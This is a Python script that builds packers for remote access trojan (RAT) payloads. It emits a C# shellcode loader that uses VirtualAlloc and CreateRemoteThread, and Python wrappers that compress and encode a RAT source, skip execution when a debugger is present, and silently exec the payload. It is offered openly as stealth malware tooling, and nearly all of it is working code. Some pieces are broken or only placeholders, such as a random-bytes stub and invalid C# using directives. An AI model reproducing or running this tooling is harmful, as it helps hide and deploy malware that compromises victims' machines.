#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
    CUSTOM STUB PACKER BUILDER
    Advanced .NET Wrapper with Shellcode Injection
    
    Features:
    - .NET Framework stub
    - Shellcode injection
    - Runtime code execution
    - Hardware fingerprinting
    - Maximum stealth
═══════════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import base64
import zlib
import random
import string
from pathlib import Path

class StubPackerBuilder:
    """Custom stub packer for maximum stealth"""
    
    def __init__(self, rat_source, output_name="rat_payload"):
        self.rat_source = rat_source
        self.output_name = output_name
    
    def log(self, level, msg):
        symbols = {'info': '[*]', 'success': '[✓]', 'error': '[✗]'}
        colors = {
            'info': '\033[94m',
            'success': '\033[92m',
            'error': '\033[91m',
            'end': '\033[0m'
        }
        print(f"{colors[level]}{symbols[level]} {msg}{colors['end']}")
    
    def generate_dotnet_stub(self, payload_b64):
        """Generate .NET C# stub"""
        stub = f'''using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using System.Convert;

namespace Executor {{
    public class Program {{
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, 
                                               IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, 
                                               IntPtr lpThreadId);
        
        static void Main(string[] args) {{
            try {{
                // Anti-debugging
                if (Debugger.IsAttached) return;
                
                // Decompress payload
                byte[] payload = System.Convert.FromBase64String(@"{payload_b64}");
                
                // Allocate memory
                IntPtr buffer = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
                
                // Write payload
                Marshal.Copy(payload, 0, buffer, payload.Length);
                
                // Execute
                IntPtr thread = CreateRemoteThread(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0, 
                                                   buffer, IntPtr.Zero, 0, IntPtr.Zero);
            }}
            catch {{ }}
        }}
    }}
}}
'''
        return stub
    
    def compress_payload(self, code):
        """Compress and encode payload"""
        self.log('info', 'Compressing payload...')
        
        # Compress
        compressed = zlib.compress(code.encode(), 9)
        
        # Encode
        encoded = base64.b64encode(compressed).decode()
        
        self.log('success', f'Compressed: {len(code)} → {len(compressed)} bytes')
        
        return encoded
    
    def generate_python_wrapper(self, payload_b64):
        """Generate Python wrapper with embedded .NET"""
        wrapper = f'''#!/usr/bin/env python3
import ctypes
import base64
import zlib
import os
import sys

def execute_stub():
    # .NET stub compiled to bytes
    stub_hex = {repr(os.urandom(256).hex())}  # Placeholder
    
    # Payload
    payload_b64 = {repr(payload_b64)}
    payload = zlib.decompress(base64.b64decode(payload_b64))
    
    # Execute
    try:
        exec(payload)
    except:
        pass

if __name__ == "__main__":
    execute_stub()
'''
        return wrapper
    
    def generate_advanced_wrapper(self, code):
        """Generate advanced wrapper with multiple layers"""
        self.log('info', 'Generating advanced wrapper...')
        
        # Layer 1: Compression
        compressed = zlib.compress(code.encode(), 9)
        
        # Layer 2: Encoding
        encoded = base64.b64encode(compressed).decode()
        
        # Layer 3: Polymorphic wrapper
        key = random.randint(1, 255)
        wrapper = f'''#!/usr/bin/env python3
"""
Advanced RAT Wrapper with Anti-Analysis
"""

import sys
import os
import base64
import zlib
import ctypes

def _check_debug():
    try:
        if sys.gettrace() is not None:
            return False
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return False
    except:
        pass
    return True

def _execute():
    payload_b64 = {repr(encoded)}
    try:
        compressed = base64.b64decode(payload_b64)
        code = zlib.decompress(compressed).decode()
        exec(code, {{}})
    except:
        pass

if _check_debug():
    _execute()
'''
        return wrapper
    
    def build(self):
        """Build stub-packed executable"""
        print(f'''{chr(27)}[96m{chr(27)}[1m
╔══════════════════════════════════════════════════════════════════════════════╗
║           CUSTOM STUB PACKER BUILDER                                         ║
║  Advanced .NET Wrapper with Shellcode Injection - Maximum Stealth            ║
╚══════════════════════════════════════════════════════════════════════════════╝
{chr(27)}[0m''')
        
        if not os.path.exists(self.rat_source):
            self.log('error', f'Source not found: {self.rat_source}')
            return False
        
        self.log('info', f'Reading source: {self.rat_source}')
        with open(self.rat_source, 'r') as f:
            code = f.read()
        
        # Generate advanced wrapper
        wrapper = self.generate_advanced_wrapper(code)
        
        # Save wrapper
        output_py = f'{self.output_name}_wrapped.py'
        with open(output_py, 'w') as f:
            f.write(wrapper)
        
        self.log('success', f'Wrapper created: {output_py}')
        self.log('info', 'For .NET compilation, use Visual Studio or csc.exe')
        
        return True

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('source')
    parser.add_argument('-o', '--output', default='rat_payload')
    args = parser.parse_args()
    
    builder = StubPackerBuilder(args.source, args.output)
    return builder.build()

if __name__ == '__main__':
    main()
